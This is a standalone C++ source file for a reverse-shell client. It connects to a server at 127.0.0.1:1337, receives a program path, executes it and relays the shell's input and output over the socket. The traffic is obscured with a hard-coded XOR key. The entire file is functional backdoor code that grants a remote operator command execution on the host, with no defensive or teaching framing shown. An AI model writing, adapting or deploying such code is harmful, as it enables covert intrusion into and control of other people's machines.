#include<iostream>
#include<thread>
#include<string>
#include<cstring> 		
#include<csignal>
#include<unistd.h>
#include<fcntl.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<netinet/in.h>
#include<netdb.h>

class Client{
	private:
		std::string strPassword = "$up3rP@sSw0rD";
	public:
		int sckSocket;
		bool isRunningShell = false;
		bool Connect(const char*, const char*);
		void CloseConnection();
		std::string Xor(const std::string);
		void SpawnShell(const char*);
		void threadReadShell(int);
};

void Client::threadReadShell(int iPipe){
	char cCmdOutput[256];
	int iRet = 0, iLen = 0;
	while(isRunningShell){
		iRet = read(iPipe, &cCmdOutput, 255);
		if(iRet > 0){
			cCmdOutput[iRet] = '\0';
			std::string strOut = Xor(std::string(cCmdOutput));
			iLen = strOut.length();
			iRet = send(sckSocket, strOut.c_str(), iLen, 0);
			if(iRet <= 0){
				//socket error
				isRunningShell = false;
				break;
			}
		} else if(iRet == -1){
			isRunningShell = false;
			break;
		}
	}
}

void Client::SpawnShell(const char* cCmdLine){
	int InPipe[2], OutPipe[2];
	std::string strMessage = "";
	int iLen = 0;
	if(pipe(InPipe) == -1){
		//error creating pipes
		strMessage = Xor(std::string("xx0"));
		iLen = strMessage.length();
		send(sckSocket, strMessage.c_str(), iLen, 0);
		return;
	}
	if(pipe(OutPipe) == -1){
		//error creating pipes
		strMessage = Xor(std::string("xx0"));
		iLen = strMessage.length();
		send(sckSocket, strMessage.c_str(), iLen, 0);
		return;
	}
	pid_t pID = fork();
	if(pID == 0){
		strMessage = Xor(std::string("xx1"));
		iLen = strMessage.length();
		if(send(sckSocket, strMessage.c_str(), iLen ,0) <= 0){
			//unable to send confirmation to server
			exit(0);
		}
		
		dup2(InPipe[0], 0);  //stdin
		dup2(OutPipe[1], 1); //stdout
		dup2(OutPipe[1], 2); //stderr
		
		close(InPipe[0]);
		close(InPipe[1]);
		close(OutPipe[0]);
		close(OutPipe[1]);
		
		char *arg[] = {nullptr};
		char *env[] = {nullptr};
		char CMD[128];
		strncpy(CMD, &cCmdLine[2], 128);
		execve(CMD, arg, env);
		exit(0);
	} else if(pID > 0){
		close(InPipe[0]);
		close(OutPipe[1]);
		isRunningShell = true;
		std::thread th1(&Client::threadReadShell, this, OutPipe[0]);
		std::string strCmd = "";
		char cCmdBuffer[1025];
		int iBytes = 0;
		while(isRunningShell){
			iBytes = recv(sckSocket, cCmdBuffer, 1024, 0);
			if(iBytes > 0){
				cCmdBuffer[iBytes] = '\0';
				strCmd = Xor(std::string(cCmdBuffer));
				iLen = strCmd.length();
				if(write(InPipe[1], strCmd.c_str(), iLen) == -1){
					isRunningShell = false;
					break;
				}
			} else if(iBytes == -1){
				//socket error;
				isRunningShell = false;
				break;
			}
		}
		th1.join();
	} else {
		//fork failed
		strMessage = Xor(std::string("xx0"));
		iLen = strMessage.length();
		send(sckSocket, strMessage.c_str(), iLen, 0);
		close(InPipe[0]);
		close(InPipe[1]);
		close(OutPipe[0]);
		close(OutPipe[1]);
		return;
	}
}

std::string Client::Xor(const std::string strMessage){
	std::string strFinal = "";
	for(char mC : strMessage){
		for(char xC : strPassword){
			mC ^= xC;
		}
		strFinal.append(1, mC);
	}
	return strFinal;
}

void Client::CloseConnection(){
	close(sckSocket);
}

bool Client::Connect(const char* cHost, const char* cPort){
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	int iRet = getaddrinfo(cHost, cPort, &strctAd, &strctServer);
	if(iRet != 0){
		//getaddrinfo error
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
			//socket error
			continue;
		}
		if(connect(sckSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			//connect error
			continue;
		}
		//success
		break;
	}
	if(strctP == nullptr){
		//unable to connect
		freeaddrinfo(strctServer);
		return false;
	}
	freeaddrinfo(strctServer);
	return true;
}

int main(){
	signal(SIGPIPE, SIG_IGN);
	Client *Cli = new Client;
	if(Cli->Connect("127.0.0.1", "1337")){
		char cCmdLine[128];
		int iBytes = recv(Cli->sckSocket, cCmdLine, 128, 0);
		if(iBytes > 0){
			cCmdLine[iBytes] = '\0';
			std::string strCmd = Cli->Xor(std::string(cCmdLine));
			Cli->SpawnShell(strCmd.c_str());
			Cli->CloseConnection();
		} else {
			//error receiving command
		}
	}
	delete Cli;
	Cli = nullptr;
	return 0;
}
